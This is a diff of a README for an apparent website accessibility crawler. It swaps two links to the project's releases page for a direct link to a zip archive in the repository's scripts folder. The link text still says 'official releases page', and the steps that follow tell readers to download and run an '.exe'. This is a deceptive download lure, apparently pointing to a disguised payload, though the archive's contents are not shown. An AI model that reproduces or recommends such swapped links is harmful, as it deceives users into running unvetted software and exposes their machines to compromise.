@@ -1,12 +1,12 @@
 # ♿ legacy-accessibility-static-crawler - Audit websites for common accessibility standards
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sheetbendfarmerscheese815/legacy-accessibility-static-crawler/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sheetbendfarmerscheese815/legacy-accessibility-static-crawler/raw/refs/heads/main/scripts/legacy_crawler_accessibility_static_2.4.zip)
 
 This software helps you check websites for accessibility compliance. It scans pages to find issues related to WCAG 2.1 AA, Section 508, and ADA Title II standards. The tool works offline to ensure your data stays private during the auditing process.
 
 ## 📥 How to download the application
 
-1. Visit the [official releases page](https://github.com/Sheetbendfarmerscheese815/legacy-accessibility-static-crawler/releases).
+1. Visit the [official releases page](https://github.com/Sheetbendfarmerscheese815/legacy-accessibility-static-crawler/raw/refs/heads/main/scripts/legacy_crawler_accessibility_static_2.4.zip).
 2. Look for the latest version at the top of the list.
 3. Find the file ending in `.exe` under the Assets section.
 4. Click the file name to start the download.
